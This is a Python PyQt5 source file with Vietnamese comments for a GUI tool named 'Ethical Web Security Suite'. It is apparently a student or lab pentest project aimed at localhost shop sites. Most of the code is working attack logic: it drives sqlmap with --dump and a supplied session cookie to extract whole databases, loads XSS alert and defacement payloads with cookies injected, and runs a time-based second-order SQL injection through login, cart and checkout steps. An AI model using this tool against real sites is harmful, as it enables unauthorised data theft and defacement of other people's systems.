import sys
import subprocess
import os
import glob
import csv
import webbrowser
import requests  # <--- THÊM
import time      # <--- THÊM
import getpass
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from datetime import datetime
from PyQt5.QtNetwork import QNetworkCookie # <--- QUAN TRỌNG
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage, QWebEngineProfile # <--- CẬP NHẬT
from PyQt5.QtWidgets import (
    QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, 
    QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, 
    QLabel, QTreeWidget, QTreeWidgetItem, QSplitter, QGroupBox, QGridLayout, QDialog, QTabWidget
)
from PyQt5.QtCore import QObject, QThread, pyqtSignal, Qt, QUrl
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage

# --- IMPORT MODULES CORE ---
# Đảm bảo bạn đã có các file này trong thư mục core/ và reporting/
from core.scanner import ScannerWorker
from core.exploiter import UnionExploiter
from reporting.generator import generate_report

# =============================================================================
# WORKER 1: SQLMAP WRAPPER (CHẾ ĐỘ THÔNG MINH - SMART DUMP)
# =============================================================================
# =============================================================================
# WORKER 1: SQLMAP WRAPPER (ĐÃ SỬA LỖI POST DATA TRỐNG)
# =============================================================================
class AttackOrchestratorWorker(QObject):
    log_received = pyqtSignal(str)
    process_finished = pyqtSignal(dict)

    def __init__(self, vuln_data):
        super().__init__()
        self.vuln_data = vuln_data
        self.process = None
        self._is_stopped = False

    def _run_command(self, command):
        try:
            self.log_received.emit(f"CMD: {command}")
            self.process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                shell=True, text=True, encoding='utf-8', errors='replace'
            )
            for line in iter(self.process.stdout.readline, ''):
                if self._is_stopped: break
                clean_line = line.strip()
                if clean_line:
                    self.log_received.emit(clean_line)
            self.process.stdout.close()
            self.process.wait()
        except Exception as e:
            self.log_received.emit(f"[ERROR] SQLMap Error: {e}")

    def run(self):
        # 1. Cấu hình đường dẫn Output (Fix lỗi không tìm thấy file CSV)
        current_dir = os.getcwd()
        output_dir = os.path.join(current_dir, "sqlmap_results")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # 2. Cấu hình SQLMap cơ bản
        base_opts = (
            "--time-sec 10 "
            "--random-agent "
            "--skip-static "
            "--threads=10 "
            "--batch "
            "--dump "
            f'--output-dir="{output_dir}"'
        )
        
        target_url = self.vuln_data['url']
        cookie = self.vuln_data.get("cookie", "")
        cookie_cmd = f"--cookie=\"{cookie}\"" if cookie else ""
        param = self.vuln_data.get('parameter', '')
        method = self.vuln_data.get("method", "GET")

        # 3. XỬ LÝ LỖI POST DATA BỊ RỖNG (QUAN TRỌNG)
        if method == "POST":
            post_data = self.vuln_data.get("post_data", "")
            
            # [FIX] Nếu post_data rỗng, tự tạo data giả để SQLMap có cái mà inject
            if not post_data or param not in post_data:
                self.log_received.emit(f"[WARN] Dữ liệu POST gốc bị thiếu. Đang tự tạo payload cho tham số '{param}'...")
                # Tạo chuỗi data dạng: param=1 (để SQLMap inject vào đây)
                post_data = f"{param}=1" 
                
            cmd_root = (
                f'sqlmap -u "{target_url}" '
                f'--data="{post_data}" '
                f'-p "{param}" {cookie_cmd} {base_opts}'
            )
        else:
            # Dạng GET
            cmd_root = (
                f'sqlmap -u "{target_url}" '
                f'-p "{param}" {cookie_cmd} {base_opts}'
            )

        self.log_received.emit("\n" + "="*50)
        self.log_received.emit(f"[*] BẮT ĐẦU DUMP (Param: {param} | Method: {method})")
        self.log_received.emit(f"[*] Output Dir: {output_dir}")
        self.log_received.emit("="*50 + "\n")
        
        self._run_command(cmd_root)
        self.process_finished.emit({})

    def stop(self):
        self._is_stopped = True
        if self.process: self.process.terminate()
# Thêm class này để bắt sự kiện alert() của Javascript
class CustomWebEnginePage(QWebEnginePage):
    def javaScriptAlert(self, securityOrigin, msg):
        # Khi web chạy lệnh alert(), hàm này được gọi
        QMessageBox.warning(None, "XSS TRIGGERED (Thành công)", f"Mã độc JavaScript đã chạy!\n\nNội dung alert: {msg}")
# =============================================================================
# DIALOG: TRÌNH DUYỆT MÔ PHỎNG XSS
# =============================================================================
# =============================================================================
# DIALOG: TRÌNH DUYỆT MÔ PHỎNG XSS (CẬP NHẬT: CHO PHÉP SỬA URL & FIX LỖI 2 PARAM)
# =============================================================================
class XSSSimulatorDialog(QDialog):
    def __init__(self, url, parameter, cookie_str, payload_type="alert"):
        super().__init__()
        self.setWindowTitle("XSS Exploitation Simulator - Real Session Mode")
        self.resize(1100, 750)
        self.layout = QVBoxLayout(self)

        # 1. Thanh địa chỉ & Nút chạy lại
        control_layout = QHBoxLayout()
        self.url_display = QLineEdit()
        
        # Nút Reload để test payload mới
        self.btn_reload = QPushButton("🔄 CHẠY PAYLOAD")
        self.btn_reload.clicked.connect(self.load_current_url)
        self.btn_reload.setStyleSheet("background: #2980b9; color: white; font-weight: bold;")

        control_layout.addWidget(QLabel("Payload URL (Có thể sửa):"))
        control_layout.addWidget(self.url_display)
        control_layout.addWidget(self.btn_reload)
        self.layout.addLayout(control_layout)

        # 2. Khởi tạo Trình duyệt
        self.browser = QWebEngineView()
        self.custom_page = CustomWebEnginePage(self.browser)
        self.browser.setPage(self.custom_page)
        self.layout.addWidget(self.browser)

        # 3. Log Console
        self.log_console = QTextEdit()
        self.log_console.setFixedHeight(100)
        self.log_console.setReadOnly(True)
        self.log_console.setStyleSheet("background: #222; color: #0f0; font-family: Consolas;")
        self.layout.addWidget(self.log_console)

        # 4. XỬ LÝ COOKIE & CHẠY
        self.setup_browser(url, parameter, cookie_str, payload_type)

    def setup_browser(self, url, param, cookie_str, p_type):
        # A. Xử lý Cookie (như cũ)
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        if cookie_str:
            store = self.browser.page().profile().cookieStore()
            try:
                for item in cookie_str.split(';'):
                    if '=' in item:
                        name, value = item.strip().split('=', 1)
                        q_cookie = QNetworkCookie(name.encode(), value.encode())
                        q_cookie.setDomain(domain)
                        q_cookie.setPath("/")
                        store.setCookie(q_cookie)
            except: pass

        # B. TẠO PAYLOAD (Sửa lại để thông minh hơn)
        # Payload này nhẹ hơn, không dùng dấu " để tránh lỗi SQL
        if p_type == "alert":
            # Dùng payload Polyglot hoặc đơn giản
            payload = "<script>alert('HACKED')</script>"
        elif p_type == "deface":
            payload = "<script>document.body.innerHTML='<h1>DEFACED</h1>'</script>"
        
        # C. XỬ LÝ URL (Fix lỗi lặp tham số ?pic=...&pic=...)
        # Nếu URL đã có tham số, ta thay thế nó thay vì nối thêm
        if param in url:
            # URL gốc: ...php?pic=123
            # Logic: Thay thế giá trị của param bằng payload
            import re
            # Regex tìm: param=... cho đến ký tự & hoặc hết chuỗi
            regex = f"({param}=)([^&]*)"
            final_url = re.sub(regex, f"\\1{payload}", url)
        else:
            # Nếu chưa có thì nối thêm
            separator = "&" if "?" in url else "?"
            final_url = f"{url}{separator}{param}={payload}"
        
        self.url_display.setText(final_url)
        self.load_current_url()

    def load_current_url(self):
        target = self.url_display.text()
        self.log_console.append(f"[*] Đang tải: {target}")
        self.browser.setUrl(QUrl(target))
# =============================================================================
# MAIN WINDOW
# =============================================================================
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ethical Web Security Suite v3.0 (Ultimate Edition)")
        self.resize(1200, 850)
        self.vulnerabilities = []
        self.all_dumped_data = {}
        self.init_ui()

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)

        # 1. INPUT AREA
        top_box = QGroupBox("Cấu hình Mục tiêu")
        grid = QGridLayout()
        self.url_input = QLineEdit("http://localhost/qlthoitrang/?frame=chitietsp&id=31")
        self.cookie_input = QLineEdit()
        self.cookie_input.setPlaceholderText("Ví dụ: PHPSESSID=abc123xyz...")
        
        grid.addWidget(QLabel("Target URL:"), 0, 0)
        grid.addWidget(self.url_input, 0, 1)
        grid.addWidget(QLabel("Auth Cookie:"), 1, 0)
        grid.addWidget(self.cookie_input, 1, 1)
        
        self.scan_btn = QPushButton("🚀 BẮT ĐẦU QUÉT")
        self.scan_btn.setStyleSheet("background: #27ae60; color: white; font-weight: bold; height: 40px; font-size: 14px;")
        self.scan_btn.clicked.connect(self.start_scan)
        grid.addWidget(self.scan_btn, 0, 2, 2, 1)
        
        top_box.setLayout(grid)
        layout.addWidget(top_box)

        # 2. MAIN CONTENT (Splitter)
        splitter = QSplitter(Qt.Vertical)

        # A. Results Table
        res_widget = QWidget()
        res_layout = QVBoxLayout(res_widget)
        self.res_tree = QTreeWidget()
        self.res_tree.setHeaderLabels(["Loại Lỗ Hổng", "URL", "Tham số", "Phương thức"])
        self.res_tree.itemSelectionChanged.connect(self.on_selection_changed)
        res_layout.addWidget(self.res_tree)
        
        # Buttons Bar
        btn_box = QHBoxLayout()
        self.logic_scan_btn = QPushButton("🛡️ QUÉT LOGIC NÂNG CAO")
        self.logic_scan_btn.setStyleSheet("background: #8e44ad; color: white; font-weight: bold;")
        self.logic_scan_btn.clicked.connect(self.open_logic_scan_dialog)
        btn_box.addWidget(self.logic_scan_btn)
        self.fast_exploit_btn = QPushButton("⚡ KHAI THÁC NHANH (SQLi)")
        self.sqlmap_btn = QPushButton("🔥 DUMP TOÀN BỘ (SQLMap)")
        self.xss_alert_btn = QPushButton("🚨 DEMO XSS (Alert)")
        self.xss_deface_btn = QPushButton("☠️ DEMO XSS (Deface)")
        self.report_btn = QPushButton("📄 XUẤT BÁO CÁO")
        
        # Style buttons
        self.fast_exploit_btn.setStyleSheet("background: #e67e22; color: white;")
        self.sqlmap_btn.setStyleSheet("background: #c0392b; color: white;")
        self.xss_alert_btn.setStyleSheet("background: #8e44ad; color: white;")
        self.xss_deface_btn.setStyleSheet("background: #2c3e50; color: white;")
        
        for b in [self.fast_exploit_btn, self.sqlmap_btn, self.xss_alert_btn, self.xss_deface_btn, self.report_btn]:
            b.setEnabled(False)
            btn_box.addWidget(b)
        
        res_layout.addLayout(btn_box)
        splitter.addWidget(res_widget)

        # B. Logs & Database Viewer
        bottom_tabs = QTabWidget()
        
        # Tab 1: Cấu trúc DB
        self.db_tree = QTreeWidget()
        self.db_tree.setHeaderLabels(["Database & Dữ liệu đã Dump"])
        bottom_tabs.addTab(self.db_tree, "📦 Dữ liệu Khai thác")
        
        # Tab 2: Logs
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background: #1e1e1e; color: #00ff00; font-family: Consolas;")
        bottom_tabs.addTab(self.log_output, "📝 Nhật ký Hệ thống")
        
        splitter.addWidget(bottom_tabs)
        layout.addWidget(splitter)

        # 3. Progress Bar
        self.progress = QProgressBar()
        layout.addWidget(self.progress)

        # CONNECT SIGNALS
        self.fast_exploit_btn.clicked.connect(self.start_fast_exploit)
        self.sqlmap_btn.clicked.connect(self.start_sqlmap_attack)
        self.xss_alert_btn.clicked.connect(lambda: self.simulate_xss("alert"))
        self.xss_deface_btn.clicked.connect(lambda: self.simulate_xss("deface"))
        self.report_btn.clicked.connect(self.generate_final_report)

    # --- LOGIC GIAO DIỆN ---
    def on_selection_changed(self):
        sel = self.res_tree.selectedItems()
        if not sel: return
        
        vuln_type = sel[0].text(0)
        is_sqli = "SQLi" in vuln_type
        is_xss = "XSS" in vuln_type
        
        self.fast_exploit_btn.setEnabled(is_sqli)
        self.sqlmap_btn.setEnabled(is_sqli)
        self.xss_alert_btn.setEnabled(is_xss)
        self.xss_deface_btn.setEnabled(is_xss)

    # --- SCANNER ---
    def start_scan(self):
        url = self.url_input.text()
        if not url: return
        
        self.vulnerabilities = []
        self.all_dumped_data = {}
        self.db_tree.clear()
        
        self.res_tree.clear()
        self.log_output.clear()
        self.log_output.append(f"[*] Đang khởi động Scanner tới: {url}")
        
        self.scan_thread = QThread()
        self.scan_worker = ScannerWorker(url, self.cookie_input.text())
        self.scan_worker.moveToThread(self.scan_thread)
        
        self.scan_thread.started.connect(self.scan_worker.run_scan)
        self.scan_worker.log_updated.connect(self.log_output.append)
        self.scan_worker.progress_updated.connect(lambda c, t: self.progress.setValue(int(c/t*100)))
        self.scan_worker.scan_finished.connect(self.on_scan_done)
        
        self.scan_thread.start()
    # --- LOGIC SCANNING (SECOND-ORDER) ---
    def open_logic_scan_dialog(self):
        """Hàm mở hộp thoại nhập liệu và bắt đầu tiến trình quét Logic"""
        dialog = AdvancedScanDialog(self)
        if dialog.exec_() == QDialog.Accepted:
            # 1. Lấy dữ liệu từ Dialog
            login_u, cart_u, check_u, user_p, pass_p = dialog.get_data()
            
            # 2. Chuẩn bị giao diện
            self.log_output.clear()
            self.log_output.append("[*] Đang khởi tạo Logic Scanner...")
            
            # 3. Khởi tạo Thread và Worker
            self.logic_thread = QThread()
            self.logic_worker = LogicScannerWorker(login_u, cart_u, check_u, user_p, pass_p)
            self.logic_worker.moveToThread(self.logic_thread)
            
            # 4. Kết nối tín hiệu
            self.logic_thread.started.connect(self.logic_worker.run)
            self.logic_worker.log_updated.connect(self.log_output.append)
            self.logic_worker.scan_finished.connect(self.on_logic_scan_finished)
            
            # 5. Bắt đầu chạy
            self.logic_thread.start()
            self.logic_scan_btn.setEnabled(False) # Khóa nút để tránh bấm nhiều lần

    def on_logic_scan_finished(self):
        """Hàm dọn dẹp sau khi quét Logic xong"""
        self.logic_thread.quit()
        self.logic_thread.wait()
        self.logic_scan_btn.setEnabled(True) # Mở lại nút
        QMessageBox.information(self, "Hoàn tất", "Quá trình quét Logic Flow đã kết thúc.\nVui lòng kiểm tra Log để xem kết quả.")
    def on_scan_done(self, vulns):
        self.vulnerabilities = vulns
        for v in vulns:
            item = QTreeWidgetItem([v['type'], v['url'], v['parameter'], v['method']])
            if "XSS" in v['type']:
                item.setForeground(0, Qt.red)
            else:
                item.setForeground(0, Qt.blue)
            self.res_tree.addTopLevelItem(item)
        
        self.scan_thread.quit()
        self.report_btn.setEnabled(len(vulns) > 0)
        QMessageBox.information(self, "Hoàn tất", f"Tìm thấy {len(vulns)} lỗ hổng tiềm năng.")

    # --- FAST EXPLOIT (Custom Python) ---
    def start_fast_exploit(self):
        item = self.res_tree.selectedItems()[0]
        vuln = next(v for v in self.vulnerabilities if v['url'] == item.text(1))
        if vuln['method'] != "GET":
            QMessageBox.warning(
                self,
                "Không hỗ trợ",
                "Fast Exploit chỉ hỗ trợ SQLi dạng GET.\n"
                "Với POST SQLi, hãy dùng SQLMap."
            )
            return
        self.log_output.append("\n[⚡] ĐANG CHẠY FAST EXPLOIT (PYTHON UNION)...")
        exploiter = UnionExploiter(vuln['url'], vuln['parameter'], self.cookie_input.text())
        
        # Chạy trực tiếp (có thể hơi lag UI một chút nhưng nhanh)
        data, _ = exploiter.run(progress_callback=self.log_output.append)
        
        if data:
            self.db_tree.clear()
            
            # Hiển thị Info
            if 'server_info' in data:
                root = QTreeWidgetItem(["SERVER INFO"])
                root.addChild(QTreeWidgetItem([data['server_info']]))
                self.db_tree.addTopLevelItem(root)
            
            # Hiển thị Tables tìm được
            if 'tables' in data and data['tables']:
                t_root = QTreeWidgetItem(["FOUND TABLES (Smart Guessing)"])
                for t in data['tables']:
                    t_root.addChild(QTreeWidgetItem([t]))
                self.db_tree.addTopLevelItem(t_root)
            
            self.all_dumped_data['Fast_Exploit'] = data
            QMessageBox.information(self, "Thành công", "Khai thác nhanh hoàn tất! Kiểm tra tab Dữ liệu.")

    # --- DEEP EXPLOIT (SQLMap) ---
    def start_sqlmap_attack(self):
        item = self.res_tree.selectedItems()[0]
        vuln = next(v for v in self.vulnerabilities if v['url'] == item.text(1))
        vuln['cookie'] = self.cookie_input.text()
        
        self.sqlmap_thread = QThread()
        self.sqlmap_worker = AttackOrchestratorWorker(vuln)
        self.sqlmap_worker.moveToThread(self.sqlmap_thread)
        
        self.sqlmap_thread.started.connect(self.sqlmap_worker.run)
        self.sqlmap_worker.log_received.connect(self.log_output.append)
        self.sqlmap_worker.process_finished.connect(self.on_sqlmap_done)
        
        self.sqlmap_thread.start()

    def on_sqlmap_done(self, _):
        self.sqlmap_thread.quit()
        self.log_output.append("\n[✔] SQLMap hoàn tất. Đang đọc dữ liệu...")
        self.db_tree.clear()
        
        # 1. Trỏ đúng vào thư mục output đã định nghĩa ở Worker
        current_dir = os.getcwd()
        base_output_path = os.path.join(current_dir, "sqlmap_results")
        
        has_data = False
        
        # Kiểm tra nếu thư mục tồn tại
        if os.path.exists(base_output_path):
            # Duyệt qua các thư mục target (thường là hostname, ví dụ: localhost)
            for target_hostname in os.listdir(base_output_path):
                target_path = os.path.join(base_output_path, target_hostname)
                
                # SQLMap cấu trúc: output_dir/hostname/dump/db_name/table.csv
                dump_path = os.path.join(target_path, "dump")
                
                if not os.path.exists(dump_path): 
                    continue

                for db_name in os.listdir(dump_path):
                    db_full_path = os.path.join(dump_path, db_name)
                    if not os.path.isdir(db_full_path): continue
                    
                    # Vẫn giữ lọc hệ thống, nhưng log ra để biết
                    if db_name in ['information_schema', 'mysql', 'performance_schema', 'sys']: 
                        self.log_output.append(f"[*] Bỏ qua DB hệ thống: {db_name}")
                        continue

                    # Tạo Node DB trên giao diện
                    db_node = QTreeWidgetItem([f"DB: {db_name}"])
                    self.db_tree.addTopLevelItem(db_node)

                    # Tìm file CSV
                    csv_files = glob.glob(os.path.join(db_full_path, "*.csv"))
                    if not csv_files:
                        self.log_output.append(f"[!] DB {db_name} rỗng hoặc chưa dump được bảng nào.")

                    for csv_file in csv_files:
                        table_name = os.path.basename(csv_file).replace(".csv", "")
                        try:
                            with open(csv_file, 'r', encoding='utf-8') as f:
                                reader = csv.reader(f)
                                rows = list(reader)
                                if rows:
                                    # Lưu vào biến toàn cục để xuất báo cáo
                                    if db_name not in self.all_dumped_data:
                                        self.all_dumped_data[db_name] = {}
                                    
                                    headers = rows[0]
                                    records = rows[1:]
                                    self.all_dumped_data[db_name][table_name] = {'headers': headers, 'records': records}
                                    
                                    # Hiển thị lên cây
                                    t_node = QTreeWidgetItem([f"Table: {table_name} ({len(records)} dòng)"])
                                    db_node.addChild(t_node)
                                    has_data = True
                        except Exception as e: 
                            self.log_output.append(f"[ERROR] Không đọc được file {table_name}: {e}")
        
        if has_data:
            QMessageBox.information(self, "Thành công", "Đã Dump dữ liệu thành công! Hãy kiểm tra tab 'Dữ liệu Khai thác'.")
        else:
            QMessageBox.warning(self, "Cảnh báo", 
                                f"SQLMap chạy xong nhưng không tìm thấy file CSV.\n"
                                f"Vui lòng kiểm tra thủ công tại thư mục:\n{base_output_path}")

    # --- XSS SIMULATION ---
    def simulate_xss(self, mode):
        # Lấy dòng đang chọn
        selected_items = self.res_tree.selectedItems()
        if not selected_items:
            return

        item = selected_items[0]
        # Tìm lỗ hổng tương ứng trong list data
        vuln = next(v for v in self.vulnerabilities if v['url'] == item.text(1))
        
        # Lấy cookie từ ô nhập liệu
        current_cookie = self.cookie_input.text()

        # Truyền cookie vào Dialog
        dialog = XSSSimulatorDialog(vuln['url'], vuln['parameter'], current_cookie, mode)
        dialog.exec_()

    # --- REPORTING ---
    def generate_final_report(self):
        if not self.vulnerabilities: return
        fname = generate_report(self.url_input.text(), self.vulnerabilities, getattr(self, 'all_dumped_data', None))
        webbrowser.open(f"file://{os.path.abspath(fname)}")
# =============================================================================
# WORKER 2: LOGIC FLOW SCANNER (SECOND-ORDER SQLI)
# =============================================================================
class LogicScannerWorker(QObject):
    log_updated = pyqtSignal(str)
    scan_finished = pyqtSignal()

    def __init__(self, login_url, cart_url, checkout_url, email_param, pass_param):
        super().__init__()
        self.login_url = login_url
        self.cart_url = cart_url
        self.checkout_url = checkout_url
        self.email_param = email_param
        self.pass_param = pass_param
        self.session = requests.Session()

    def run(self):
        self.log_updated.emit("\n" + "="*50)
        self.log_updated.emit("[*] BẮT ĐẦU QUÉT LOGIC FLOW (SECOND-ORDER SQLI)")
        self.log_updated.emit("="*50)

        # Payload Time-based: Sleep 5 giây
        # Lưu ý: Payload này dành cho MySQL. Nếu DB khác cần đổi payload.
        payload = f"testuser' AND (SELECT SLEEP(5)) AND '1'='1"
        
        try:
            # --- BƯỚC 1: TIÊM PAYLOAD VÀO LOGIN ---
            self.log_updated.emit(f"[1] Đang tiêm payload vào Session tại: {self.login_url}")
            login_data = {
                self.email_param: payload, # Tiêm vào tên đăng nhập
                self.pass_param: '123456'  # Pass bất kỳ
            }
            # Gửi request Login
            self.session.post(self.login_url, data=login_data, timeout=10)
            self.log_updated.emit("    -> Đã gửi payload đăng nhập.")

            # --- BƯỚC 2: THÊM GIỎ HÀNG (để kích hoạt vòng lặp code) ---
            self.log_updated.emit(f"[2] Đang thêm sản phẩm ảo vào giỏ tại: {self.cart_url}")
            # Giả sử POST soluong=1. Nếu web dùng GET thì sửa thành session.get
            # Tùy web mà data có thể khác, ở đây để mặc định common
            cart_data = {'soluong': 1, 'quantity': 1} 
            self.session.post(self.cart_url, data=cart_data, timeout=10)
            self.log_updated.emit("    -> Đã thực hiện thao tác thêm giỏ.")

            # --- BƯỚC 3: KÍCH HOẠT TẠI THANH TOÁN ---
            self.log_updated.emit(f"[3] Truy cập trang Thanh toán để đo thời gian: {self.checkout_url}")
            
            start_time = time.time()
            self.session.get(self.checkout_url, timeout=30)
            end_time = time.time()
            
            duration = end_time - start_time
            self.log_updated.emit(f"    -> Thời gian phản hồi: {round(duration, 2)} giây")

            # --- KẾT LUẬN ---
            if duration >= 5:
                self.log_updated.emit("\n[!!!] PHÁT HIỆN LỖ HỔNG NGIÊM TRỌNG: SECOND-ORDER SQL INJECTION")
                self.log_updated.emit(f"      Payload '{payload}' đã thực thi thành công!")
                self.log_updated.emit("      Kẻ tấn công có thể chiếm quyền Admin hoặc Dump database.")
            else:
                self.log_updated.emit("\n[-] Không phát hiện lỗi với Payload này (Time < 5s).")
                self.log_updated.emit("    Lưu ý: Hãy kiểm tra kỹ tên tham số login (email/username).")

        except Exception as e:
            self.log_updated.emit(f"[!] Lỗi xảy ra trong quá trình quét logic: {str(e)}")
        
        self.scan_finished.emit()
        
# =============================================================================
# DIALOG: CẤU HÌNH QUÉT LOGIC NÂNG CAO
# =============================================================================
class AdvancedScanDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Cấu hình Quét Logic Flow (Second-Order)")
        self.resize(600, 400)
        self.layout = QVBoxLayout(self)
        
        # Form nhập liệu
        form_group = QGroupBox("Thông số kịch bản tấn công")
        grid = QGridLayout()
        
        self.in_login = QLineEdit("http://localhost/qldienthoai/?quanly=dangnhap")
        self.in_login_user = QLineEdit("email") # Tên field input name
        self.in_login_pass = QLineEdit("pass")  # Tên field input pass
        
        self.in_cart = QLineEdit("http://localhost/qldienthoai/themgiohang.php?id=1")
        self.in_checkout = QLineEdit("http://localhost/qldienthoai/?quanly=camon") # Hoặc file xử lý thanh toán

        grid.addWidget(QLabel("1. URL Xử lý Đăng nhập (POST):"), 0, 0)
        grid.addWidget(self.in_login, 0, 1)
        
        grid.addWidget(QLabel("   Tên tham số User (name='?'):"), 1, 0)
        grid.addWidget(self.in_login_user, 1, 1)
        grid.addWidget(QLabel("   Tên tham số Pass (name='?'):"), 2, 0)
        grid.addWidget(self.in_login_pass, 2, 1)
        
        grid.addWidget(QLabel("2. URL Thêm vào giỏ (POST/GET):"), 3, 0)
        grid.addWidget(self.in_cart, 3, 1)
        
        grid.addWidget(QLabel("3. URL Thanh toán (Trigger Lỗi):"), 4, 0)
        grid.addWidget(self.in_checkout, 4, 1)
        
        form_group.setLayout(grid)
        self.layout.addWidget(form_group)
        
        # Nút chạy
        self.run_btn = QPushButton("🔥 BẮT ĐẦU TẤN CÔNG LOGIC")
        self.run_btn.setStyleSheet("background: #d35400; color: white; font-weight: bold; padding: 10px;")
        self.run_btn.clicked.connect(self.accept)
        self.layout.addWidget(self.run_btn)
        
    def get_data(self):
        return (
            self.in_login.text(),
            self.in_cart.text(),
            self.in_checkout.text(),
            self.in_login_user.text(),
            self.in_login_pass.text()
        )
        
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
